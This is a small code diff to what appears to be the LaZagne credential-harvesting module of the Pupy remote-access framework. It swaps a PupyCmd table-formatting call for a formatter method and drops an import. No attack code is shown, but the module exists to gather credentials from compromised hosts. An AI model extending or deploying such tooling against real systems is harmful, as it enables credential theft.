@@ -3,7 +3,6 @@
 
 from pupylib.PupyModule import *
 from pupylib.PupyCompleter import *
-from pupylib.PupyCmd import PupyCmd
 from rpyc.utils.classic import upload
 from pupylib.utils.credentials import Credentials
 from pupylib.utils.term import colorize, terminal_size
@@ -278,7 +277,7 @@ class LaZagne(PupyModule):
 
             if not module in self.NON_TABLE:
                 self.log(
-                    PupyCmd.table_format(
+                    self.formatter.table_format(
                         self.prepare_fields(
                             creds, remove=self.FILTER_COLUMNS
                         )
